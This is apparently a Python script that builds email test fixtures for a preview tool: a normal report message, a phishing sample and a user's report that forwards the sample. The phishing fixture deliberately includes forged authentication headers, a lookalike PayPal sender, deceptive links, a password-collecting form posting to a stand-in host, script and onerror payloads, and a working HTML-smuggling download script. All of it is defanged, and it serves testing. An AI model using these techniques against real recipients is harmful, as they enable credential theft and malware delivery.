# Copyright 2026- Seongwoo Hong. All rights reserved.
"""
The email fixtures (commit 42c, docs/PREVIEWS.md › Email), written out as
MIME by hand — every header exactly as a test expects it, the same bytes
on every run. Run after make.py and office.py (it attaches their files):

    python3 -I tests/fixtures/preview/mail.py tests/fixtures/preview

(ole.mjs makes the Outlook .msg.)

report.eml         an ordinary message: SPF, DKIM and DMARC passing, a
                   Korean subject (RFC 2047) and body, HTML with a picture
                   from its own parts (cid:), a text alternative, a PDF
                   attached (report.pdf).
phish.eml          what a phishing message carries, all at once:
                   - the receiving server's SPF and DMARC failing — and a
                     FORGED Authentication-Results below it, all "pass"
                     (only the topmost counts);
                   - a display name that is another address, a domain
                     dressed as paypal.com, a Reply-To elsewhere, an
                     envelope sender elsewhere, three Received hops;
                   - a link whose text reads paypal.com, a punycode
                     domain, a user@host link, a search-ms: link to a
                     share, a shortener;
                   - a tracking pixel, a CSS background and @import from
                     outside, a meta refresh, a form asking for a
                     password, a <script>, an onerror, an iframe;
                   - attachments: invoice.pdf.exe (a "program"),
                     invoice.html (HTML smuggling), statement.docx
                     (hostile.docx, to open in its own preview).
report-to-soc.eml  a user's report: phish.eml forwarded AS AN ATTACHMENT
                   (message/rfc822) — the reader opens it in a preview of
                   its own.

Nothing in them is a working exploit: the "program" is a sentence, the
smuggled "file" is the word "gorani".
"""

import base64
import struct
import sys
import zlib
from pathlib import Path

out = Path(sys.argv[1])


def b64(data: bytes) -> str:
    s = base64.b64encode(data).decode()
    return "\r\n".join(s[i : i + 76] for i in range(0, len(s), 76))


def subject(text: str) -> str:
    return "=?UTF-8?B?" + base64.b64encode(text.encode()).decode() + "?="


def msg(lines: list[str]) -> bytes:
    return ("\r\n".join(lines) + "\r\n").encode("utf-8")


# A tiny real PNG: 2x2, green — written byte by byte, so no library stamps it.


def tiny_png() -> bytes:
    raw = b"".join(b"\x00" + b"\x22\x8b\x22" * 2 for _ in range(2))
    chunk = lambda t, d: struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 2, 2, 8, 2, 0, 0, 0)) + chunk(b"IDAT", zlib.compress(raw, 9)) + chunk(b"IEND", b"")


report_html = (
    "<html><head><style>.hi { color: #228b22; font-weight: 600 }</style></head><body>"
    '<p class="hi">Gorani email body one</p><p>고라니 메일 본문</p>'
    '<p><img src="cid:logo@gorani" alt="the Gorani logo"></p>'
    '<p>The report is attached. <a href="https://gorani.example/cases/lake">The case</a></p>'
    "</body></html>"
)
report = msg(
    [
        "Return-Path: <tests@gorani.example>",
        "Received: from mx.gorani.example (mx.gorani.example [192.0.2.10]) by mail.gorani.example with ESMTPS id r2; Fri, 2 Jan 2026 03:04:07 +0000",
        "Received: from out.gorani.example (out.gorani.example [192.0.2.20]) by mx.gorani.example with ESMTPS id r1; Fri, 2 Jan 2026 03:04:06 +0000",
        "Authentication-Results: mx.gorani.example; spf=pass smtp.mailfrom=gorani.example; dkim=pass header.d=gorani.example; dmarc=pass header.from=gorani.example",
        "From: Gorani Tests <tests@gorani.example>",
        "To: Rin <rin@gorani.example>",
        f"Subject: {subject('분기 보고서 — Quarterly report')}",
        "Date: Fri, 02 Jan 2026 03:04:05 +0000",
        "Message-ID: <report-1@gorani.example>",
        "MIME-Version: 1.0",
        'Content-Type: multipart/mixed; boundary="mixed-gorani"',
        "",
        "--mixed-gorani",
        'Content-Type: multipart/related; boundary="related-gorani"',
        "",
        "--related-gorani",
        'Content-Type: multipart/alternative; boundary="alt-gorani"',
        "",
        "--alt-gorani",
        "Content-Type: text/plain; charset=utf-8",
        "Content-Transfer-Encoding: base64",
        "",
        b64("Gorani email body one\n고라니 메일 본문\nThe report is attached.\n".encode()),
        "--alt-gorani",
        "Content-Type: text/html; charset=utf-8",
        "Content-Transfer-Encoding: base64",
        "",
        b64(report_html.encode()),
        "--alt-gorani--",
        "--related-gorani",
        "Content-Type: image/png",
        "Content-ID: <logo@gorani>",
        'Content-Disposition: inline; filename="logo.png"',
        "Content-Transfer-Encoding: base64",
        "",
        b64(tiny_png()),
        "--related-gorani--",
        "--mixed-gorani",
        'Content-Type: application/pdf; name="report.pdf"',
        'Content-Disposition: attachment; filename="report.pdf"',
        "Content-Transfer-Encoding: base64",
        "",
        b64((out / "report.pdf").read_bytes()),
        "--mixed-gorani--",
    ]
)
(out / "report.eml").write_bytes(report)

phish_html = (
    "<html><head>"
    '<style>body { background: url(https://phish.example/bg.png) } @import url("https://phish.example/track.css");</style>'
    '<meta http-equiv="refresh" content="30;url=https://phish.example/login">'
    "</head><body>"
    "<p>Your invoice is overdue. Sign in to pay it today.</p>"
    '<p><a href="https://phish.example/login">https://www.paypal.com/signin</a></p>'
    '<p><a href="https://xn--pypal-4ve.example/">PayPal support</a></p>'
    '<p><a href="https://paypal.com@203.0.113.7/verify">Verify your account</a></p>'
    '<p><a href="search-ms:query=invoice&amp;crumb=location:\\\\203.0.113.7\\share">Open the invoice folder</a></p>'
    '<p><a href="https://bit.ly/3gorani">Track your parcel</a></p>'
    '<img src="https://phish.example/open.gif?id=rin" width="1" height="1">'
    '<form action="https://phish.example/collect" method="post"><input name="user"><input type="password" name="pass"><button>Sign in</button></form>'
    "<script>alert('email script ran')</script>"
    "<img src=\"x\" onerror=\"alert('email onerror ran')\">"
    '<iframe src="https://phish.example/frame"></iframe>'
    "</body></html>"
)
smuggler = (
    "<html><body><p>Your invoice is downloading…</p><script>"
    "var b = atob('Z29yYW5p'); var blob = new Blob([b], {type: 'application/zip'});"
    "var a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'invoice.zip'; a.click();"
    "</script></body></html>"
)


def part(name: str, mime: str, data: bytes) -> list[str]:
    return [
        "--mixed-phish",
        f'Content-Type: {mime}; name="{name}"',
        f'Content-Disposition: attachment; filename="{name}"',
        "Content-Transfer-Encoding: base64",
        "",
        b64(data),
    ]


phish = msg(
    [
        "Return-Path: <bounce@mailer.bulk-sender.example>",
        "Received: from mx.gorani.example (mx.gorani.example [192.0.2.10]) by mail.gorani.example with ESMTPS id p3; Fri, 2 Jan 2026 03:04:09 +0000",
        "Received: from mail.secure-login.example (unknown [203.0.113.7]) by mx.gorani.example with ESMTP id p2; Fri, 2 Jan 2026 03:04:08 +0000",
        "Received: from localhost (unknown [198.51.100.23]) by mail.secure-login.example with SMTP id p1; Fri, 2 Jan 2026 03:04:07 +0000",
        "Authentication-Results: mx.gorani.example; spf=fail smtp.mailfrom=bulk-sender.example; dkim=none; dmarc=fail header.from=paypal.com.secure-login.example",
        "Authentication-Results: forged.example; spf=pass; dkim=pass; dmarc=pass",
        'From: "service@paypal.com" <service@paypal.com.secure-login.example>',
        "Reply-To: billing <collect@phish.example>",
        "To: rin@gorani.example",
        "Subject: Invoice overdue - action required",
        "Date: Fri, 02 Jan 2026 03:04:05 +0000",
        "Message-ID: <phish-1@secure-login.example>",
        "MIME-Version: 1.0",
        'Content-Type: multipart/mixed; boundary="mixed-phish"',
        "",
        "--mixed-phish",
        "Content-Type: text/html; charset=utf-8",
        "Content-Transfer-Encoding: base64",
        "",
        b64(phish_html.encode()),
        *part("invoice.pdf.exe", "application/octet-stream", b"MZ gorani fixture: not a program\n"),
        *part("invoice.html", "text/html", smuggler.encode()),
        *part("statement.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", (out / "hostile.docx").read_bytes()),
        "--mixed-phish--",
    ]
)
(out / "phish.eml").write_bytes(phish)

forward = msg(
    [
        "Received: from laptop.gorani.example (laptop.gorani.example [192.0.2.31]) by mail.gorani.example with ESMTPSA id f1; Fri, 2 Jan 2026 04:00:01 +0000",
        "Authentication-Results: mail.gorani.example; spf=pass smtp.mailfrom=gorani.example; dkim=pass header.d=gorani.example; dmarc=pass header.from=gorani.example",
        "From: Rin <rin@gorani.example>",
        "To: SOC <soc@gorani.example>",
        "Subject: Fwd: suspicious invoice",
        "Date: Fri, 02 Jan 2026 04:00:00 +0000",
        "Message-ID: <fwd-1@gorani.example>",
        "MIME-Version: 1.0",
        'Content-Type: multipart/mixed; boundary="mixed-fwd"',
        "",
        "--mixed-fwd",
        "Content-Type: text/plain; charset=utf-8",
        "",
        "This came in this morning. I did not click anything.",
        "--mixed-fwd",
        'Content-Type: message/rfc822; name="phish.eml"',
        'Content-Disposition: attachment; filename="phish.eml"',
        "",
        phish.decode("utf-8").rstrip("\r\n"),
        "--mixed-fwd--",
    ]
)
(out / "report-to-soc.eml").write_bytes(forward)

for name in ("report.eml", "phish.eml", "report-to-soc.eml"):
    print(f"{name}: {(out / name).stat().st_size} bytes")
